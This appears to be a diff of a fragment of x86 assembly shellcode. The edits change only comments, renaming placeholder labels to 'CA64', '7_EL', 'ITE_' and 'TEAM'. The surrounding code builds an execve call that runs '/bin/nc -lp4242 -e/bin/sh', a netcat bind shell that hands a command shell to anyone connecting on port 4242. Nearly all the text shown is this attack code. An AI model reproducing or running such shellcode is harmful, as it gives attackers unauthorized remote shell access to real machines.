@@ -19,15 +19,15 @@ Shellcode:
   mov[esi + 15], al                                       ; null terminate -lp4242
   mov[esi + 25], al                                       ; null terminate -e/bin/sh
 
-  mov[esi + 26], esi                                      ; AAAA is replaced by pointer to "/bin/nc"
+  mov[esi + 26], esi                                      ; CA64 is replaced by pointer to "/bin/nc"
 
   lea ebx, [esi + 8]                                      ; ebx is pointer to "-lp4242"
-  mov[esi +30], ebx                                       ; BBBB is replaced by pointer to "-lp4242"
+  mov[esi +30], ebx                                       ; 7_EL is replaced by pointer to "-lp4242"
 
   lea ebx, [esi + 16]                                     ; ebx is pointer to "-e/bin/sh"
-  mov[esi + 34], ebx                                      ; CCCC is replaced by pointer to "-e/bin/sh"
+  mov[esi + 34], ebx                                      ; ITE_ is replaced by pointer to "-e/bin/sh"
 
-  mov[esi + 38], eax                                      ; zero execve envp
+  mov[esi + 38], eax                                      ; zero execve envp (replace TEAM)
 
   mov al, 11                                              ; execve
   mov ebx, esi                                            ; esi is pointing to "/bin/nc"
